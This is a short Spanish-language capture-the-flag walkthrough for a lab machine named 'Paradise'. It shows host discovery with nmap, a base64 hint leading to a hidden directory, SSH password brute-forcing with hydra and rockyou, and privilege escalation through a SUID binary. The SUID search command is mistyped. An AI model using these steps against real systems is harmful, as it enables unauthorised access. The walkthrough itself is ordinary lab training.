Maquina: Paradise

Autor: kaikoperez

Dificultad: Facil

Hacemos ping para ver si hay conexion
ping 172.17.0.2 -c 1

Hacemos un escaneo de puertos con nmap
sudo nmap -p- --open -sCV --min-rate 5000 -sS -Pn -n 172.17.0.2 -vvv

Ingresamos la dirección IP en el navegador y podemos observar una página con 2 botones.

Si revisamos el código podemos observar que tiene un texto llamativo

Esta en base 64, probamos revertir el mensaje

echo " " | base64 -d

Lo agregamos a la URL y nos lleva a un archivo TXT

172.17.0.2/estoesunsecreto

encontramos un posible usuario, navegamos al archivo y leemos el mensaje

172.17.0.2/estoesunsecreto/mensaje_para_lucas.txt

Usamos hydra con lucas para conseguir el password

hydra -l lucas -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2

Nos conectamos por ssh con las credenciales obtenidas

ssh lucas@172.17.0.2
chocolate

realizamos una búsqueda de binarios con permisos SUID y SGID

find -type f -a /( -perm -u+s -0 -perm -g+s /) -exec ls -l {} /; 2>/dev/null

Encontraremos dos interesantes en los que tenemos permisos de ejecución

Ejecutamos el binario /usr/local/bin/privileged_exec y descubrimos que obtenemos privilegios de root

whoami
